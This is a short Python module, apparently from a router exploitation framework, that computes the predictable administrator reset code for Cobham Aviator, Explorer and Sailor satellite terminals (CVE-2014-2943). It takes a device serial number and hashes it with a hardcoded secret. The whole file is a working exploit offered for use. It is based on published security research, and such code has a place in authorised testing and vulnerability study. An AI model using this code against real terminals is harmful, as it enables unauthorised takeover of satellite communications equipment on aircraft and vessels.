# Name:Cobham Aviator/Explorer/Sailor admin reset code generator
# File:admin_reset_code.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 4.12.2015
# Last modified: 4.12.2015
# Shodan Dork:
# Description: generates predictable admin reset code for Cobham Aviator/Explorer/Sailor - CVE-2014-2943
# Based on work by Sinnet3000 and
# https://www.blackhat.com/docs/us-14/materials/us-14-Santamarta-SATCOM-Terminals-Hacking-By-Air-Sea-And-Land.pdf

import hashlib

import core.Misc
import core.io
from interface.messages import print_green, print_help


class Misc(core.Misc.RextMisc):

    serial = "12345678"

    def __init__(self):
        core.Misc.RextMisc.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        if args[0] == "serial":
            self.serial = args[1]
            print_green("Serial number set to: " + self.serial)

    def do_run(self, e):
        m = hashlib.md5()
        m.update(bytearray.fromhex(self.serial) + b'\x00'*12 + "kdf04rasdfKKduzA".encode('utf-8'))
        code = m.hexdigest()
        print_green("Reset code: " + code)

    def do_serial(self, e):
        print(self.serial)

    def help_set(self):
        print_help("Set value of variable: \"set serial 12345678\"")

    def help_serial(self):
        print_help("Prints value of variable serial")


Misc()
